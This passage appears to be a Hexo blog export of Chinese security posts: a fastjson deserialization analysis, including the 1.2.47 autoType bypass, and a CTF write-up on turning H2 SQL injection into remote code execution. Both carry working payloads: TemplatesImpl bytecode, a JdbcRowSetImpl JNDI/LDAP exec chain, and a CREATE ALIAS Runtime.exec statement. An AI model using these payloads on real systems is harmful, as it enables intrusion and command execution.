ABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行如上代码就会弹出计算机。<br>但是这个链的实用价值不高，因为TemplatesImpl内有很多私有类，我们要利用其来加载字节码就避不开，要给这些私有类赋值，而如果想使用parseObject给私有类赋值需要再函数内传入第三个参数Feature.SupportNonPublicField，可几乎没有开放者会这么做所以实战价值不高。</p>
<p>我们接下来，来简单分析一下。</p>
<p>相信熟悉cc链的师傅应该都知道,TemplatesImpl这个了，这个类是CC3中最后加载字节码进行命令执行的类。(具体命令执行的原理我就不展开说了，网上有很多关于cc链的分析)</p>
<img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" class="" title="alt text">
<img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" class="" title="alt text">
<p>在TemplatesImpl下可以直接触发命令执行的方法有如上的<code>getOutputProperties()</code>和<code>getTransletInstance()</code>这两个类都会触发类的实例化从而命令执行。但<br>是我们可以发现<code>getTransletInstance()</code>为私有类，而私有的get我们无法通过fastjson来调用</p>
<p>getOutputProperties()是共有类且其内部调用了newTransformer。那么这里就可以命令执行了。<br>再给一些必须的属性赋值就可以构造出payload了</p>
<h2 id="lt-1-2-47bypass"><a href="#lt-1-2-47bypass" class="headerlink" title="&lt;=1.2.47bypass"></a>&lt;=1.2.47bypass</h2><p>再FastJson的1.2.25版本后就对其进行了修复。我这里使用的是1.2.47的源码。<br>我们先尝试拿之前的payload进行运行<br>会发现抛出了异常<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/52.png" class="" title="alt text"><br>打开报错的位置会发现是checkAutoType抛出的异常。<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/53.png" class="" title="alt text"><br>在往上看就会发现是在加载类是使用了checkAutoType来进行过滤<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/51.png" class="" title="alt text"><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">// 重载方法：提供默认的 JSON 解析特性 features 参数，调用另一个 checkAutoType 方法</span></span><br><span class="line">    <span class="keyword">return</span> checkAutoType(typeName, expectClass, JSON.DEFAULT_PARSER_FEATURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// 如果 typeName 为 null，返回 null，表示无法处理的类型</span></span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 typeName 的长度不符合要求（过长或过短），抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将类名中的 &#x27;$&#x27; 替换为 &#x27;.&#x27;，处理内部类</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FNV-1a 哈希算法的常量定义，用于计算字符串的哈希值</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 className 第一个字符的哈希值 h1</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 h1 的值等于 0xaf64164c86024f1aL，表示可能是危险类型，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算第一个字符与最后一个字符的哈希值，如果匹配危险类型，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算前三个字符的哈希值 h3</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">            * PRIME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果支持 autoType 或 expectClass 不为 null，则继续进行哈希匹配</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="comment">// 遍历类名从第 4 个字符开始的字符，继续计算哈希值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            hash ^= className.charAt(i);</span><br><span class="line">            hash *= PRIME;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果计算的哈希值在 acceptHashCodes 中，表示允许加载该类</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz; <span class="comment">// 返回加载的类</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果哈希值在 denyHashCodes 中，表示不允许加载该类，抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 clazz 仍然为空，尝试从映射中获取类</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果从映射中获取失败，尝试通过反序列化器加载类</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 clazz 已成功加载，进行期望类型验证</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果 expectClass 不为 null，且加载的类不是 HashMap，且类型不匹配，抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz; <span class="comment">// 返回成功加载的类</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不支持 autoType，再次进行哈希值检查</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">            hash ^= c;</span><br><span class="line">            hash *= PRIME;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果哈希值匹配 denyHashCodes，抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果哈希值匹配 acceptHashCodes，尝试加载类</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 验证加载的类与期望类型是否匹配，若不匹配抛出异常</span></span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz; <span class="comment">// 返回加载的类</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 clazz 仍然为空，尝试加载类</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次检查 clazz 是否成功加载</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果类带有 JSONType 注解，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz, JSONType.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果类是 ClassLoader 或 DataSource 的子类，认为是危险类，抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果 expectClass 不为 null，检查类型是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz; <span class="comment">// 返回加载的类</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查类的信息，若有构造函数且支持 autoType，抛出异常</span></span><br><span class="line">        <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">        <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算 autoType 支持的特性</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Feature.SupportAutoType.mask;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">autoTypeSupport</span> <span class="operator">=</span> <span class="built_in">this</span>.autoTypeSupport</span><br><span class="line">            || (features &amp; mask) != <span class="number">0</span></span><br><span class="line">            || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不支持 autoType，抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz; <span class="comment">// 返回最终加载的类</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clearDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 清空当前的反序列化器缓存</span></span><br><span class="line">    <span class="built_in">this</span>.deserializers.clear();</span><br><span class="line">    <span class="comment">// 重新初始化反序列化器</span></span><br><span class="line">    <span class="built_in">this</span>.initDeserializers();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>因为我们的autoTypeSupport为false且expectClass默认传入为null这就导致了除了从缓存来加载类之外，根本无法进入其他类加载的if语句</p>
<p>那么我们想要加载这个类就只能通过如下代码来从缓存中加载了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//步入</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">        <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>那么我们想从缓存中加载就要尝试将类写入道mappings中<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/55.png" class="" title="alt text"><br>我们全局查找mappings的用法可以找到不少mappings.put，但大部分都是写死的，只有在TypeUtils.LoadClass的我们才能控制器参数<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="literal">null</span> || className.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>))&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>我们可以看到只有当cache为true是才会对mappings进行put，而这个LoadClass在该类的内部也被进行了一次调用，且第三个参数为true如下<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/59.png" class="" title="alt text"></p>
<p>我们再继续查看调用了TypeUtils.LoadClass的类<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/60.png" class="" title="alt text"><br>往上找我们能在MiscCodec.java下找到这个类的调用当Clazz==Class.class是会调用这个。而strVal就是className。我们看一下这个strVal是怎么赋值的<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br></pre></td></tr></table></figure><br>其会先判断反序列化的类的属性是否为val，然后再将var的值赋值给objVal，而strVal的值就是(String)objVal<br>那么问题来了我们要怎么进到这个类里呢?<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/61.png" class="" title="alt text"><br>我们查看这个类实现的接口可以发现MiscCodec其实是一个反序列化器。<br>我们在之前有的审计中就有分析过。反序列化器的获取<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/56.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/57.png" class="" title="alt text"><br>在刚进入获取反序列器的方法内时都会先在derializers内找反序列化器。而我们看上面的代码可以发现当类为Class.class时返回的反序列化器就是MiscCodec</p>
<p>而我们传入的<code>@type</code>的值为java.lang.Class,而这个类默认就写再缓存里了，所以不会被waf拦截</p>
<p>也就是说当我们传入的jsoncode的@Type的值为java.lang.Class时就会自动调用这个反序列化器。那么我们再将val写成我们的恶意类名，恶意类不就被写入了吗</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/62.png" class="" title="alt text">
<p>那么既然成功写入了我们的恶意类，那只要再让其反序列化原理的恶意类即可</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_bypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;1\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\&quot;2\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HHfKyiQrGd/CommonsCollections1/Exec/eyJjbWQiOiJjYWxjIn0=\&quot;, \&quot;autoCommit\&quot;:false&#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload如上</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a><br><a href="https://www.bilibili.com/video/BV1bD4y117Qh?spm_id_from=333.788.videopod.sections&amp;vd_source=ab689e9c3d9afbb6b90af5af510d53e3">https://www.bilibili.com/video/BV1bD4y117Qh?spm_id_from=333.788.videopod.sections&amp;vd_source=ab689e9c3d9afbb6b90af5af510d53e3</a></p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/10/28/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>fastjson原生反序列化</title>
    <url>/2024/10/19/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=" "></a> </h1>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>fastjson反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>hgameweek2</title>
    <url>/2024/02/08/hgameweek2/</url>
    <content><![CDATA[<h1 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h1><p>又是一道java题，果然现在的web全是java<br>这道题目我们需要先审计源码,一开始我看的了下面的这段代码<br><img src="/2024/02/08/hgameweek2/2.png" class="" title="alt text"><br>发现了sql注入，于是我狠狠的注入了进去，结果发现表都是null，只注出来了数据库H2，于是我就在网上查了一下。<br>发现H2数据库的漏洞还不少，最典型的就是存在sql注入时可以将sql注入升级成RCE。<br>原因是H2数据库允许用户定义函数名，可以执行java代码，那么我们只要能够RCE的代码别名后再使用CALL调用即可进行RCE<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS </span><br><span class="line">$$ <span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException </span><br><span class="line">&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$</span><br><span class="line">CALL <span class="title function_">EXEC</span><span class="params">(<span class="string">&#x27;whoami&#x27;</span>)</span>;</span><br></pre></td></tr></table></figure><br>即如果再对H2数据库使用以上语句就会执行whoami。但是再执行时发现如果存在<code>&#123;</code>网页会崩。<br>由于CREATE ALIAS指令可以使用字符串（String）作为源代码（也就是直接将字符串当成代码执行），因此我们可以成功绕过这个限制。这意味着我们不需要使用$符号，可以使用内置的SQL函数来编码我们的payload。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException<span class="string">&#x27;, HEXTORAW(&#x27;</span>007b<span 